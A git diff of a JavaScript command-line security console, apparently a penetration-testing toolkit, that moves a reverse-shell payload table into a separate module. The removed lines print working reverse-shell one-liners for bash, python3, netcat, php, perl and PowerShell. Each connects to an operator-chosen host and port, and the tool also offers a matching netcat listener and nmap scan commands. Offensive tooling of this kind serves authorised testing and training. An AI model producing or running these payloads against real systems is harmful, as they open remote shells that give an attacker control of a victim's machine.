@@ -41,15 +41,7 @@ const { genPassphrase, passphraseBits } = require("./lib/passphrase"); // dicewa
 const { COMMAND_GROUPS, documentedVerbs, renderCommands } = require("./lib/reference"); // help catalog = single source of truth (lib/reference.js)
 const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, inCidr } = require("./lib/scanutil"); // security-console core logic (lib/scanutil.js)
 
-const SHELLS = {
-  bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
-  python3: (i, o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${o}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
-  nc: (i, o) => `nc -e /bin/sh ${i} ${o}`,
-  "nc-mkfifo": (i, o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${o} >/tmp/f`,
-  php: (i, o) => `php -r '$s=fsockopen("${i}",${o});exec("/bin/sh -i <&3 >&3 2>&3");'`,
-  perl: (i, o) => `perl -e 'use Socket;$i="${i}";$p=${o};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
-  powershell: (i, o) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${o});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($k=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$k);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
-};
+const { SHELLS, revshell } = require("./lib/revshell"); // reverse-shell payloads (lib/revshell.js)
 
 const CHEATS = {
   "nmap": ["nmap -sV -sC -oN scan.txt TARGET", "nmap -p- --min-rate 5000 -T4 TARGET", "nmap --script vuln TARGET"],
@@ -442,7 +434,7 @@ async function menuShell() {
   const lang = (await ask("lang [bash]:")) || "bash";
   const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
   const port = (await ask("LPORT [4444]:")) || "4444";
-  console.log("\n  " + (SHELLS[lang] || SHELLS.bash)(ip, port) + "\n");
+  console.log("\n  " + revshell(lang, ip, port) + "\n");
   console.log("  " + gray("listener: ") + `nc -lvnp ${port}`);
 }
 async function menuEncode() {
@@ -710,7 +702,7 @@ async function cli(args) {
     else if (sub === "gist") await ghNewGist(rest[1], rest.slice(2).join(" "));
     else console.log("git clone|push|pull|status|log|diff|branch|checkout|repos|new|issues|prs|issue|pr|comment|gists|gist  (token: SENTINEL_GH_TOKEN)");
   }
-  else if (cmd === "revshell") { const [lang = "bash", ip = "10.0.0.1", port = "4444"] = rest; console.log((SHELLS[lang] || SHELLS.bash)(ip, port)); }
+  else if (cmd === "revshell") { const [lang = "bash", ip = "10.0.0.1", port = "4444"] = rest; console.log(revshell(lang, ip, port)); }
   else if (cmd === "encode" || cmd === "decode") { const [type, ...v] = rest; const op = (type || "") + (cmd === "encode" ? "e" : "d"); const fn = ENC[op]; console.log(fn ? fn(v.join(" ")) : "unknown type (b64|hex|url|base32)"); }
   else if (cmd === "defang") { const t = rest.join(" "); console.log(t ? defang(t) : red("usage: sentinel defang <url|ip|email>  — neutralize an IOC for safe pasting")); }
   else if (cmd === "refang") { const t = rest.join(" "); console.log(t ? refang(t) : red("usage: sentinel refang <defanged text>  — reverse defang")); }
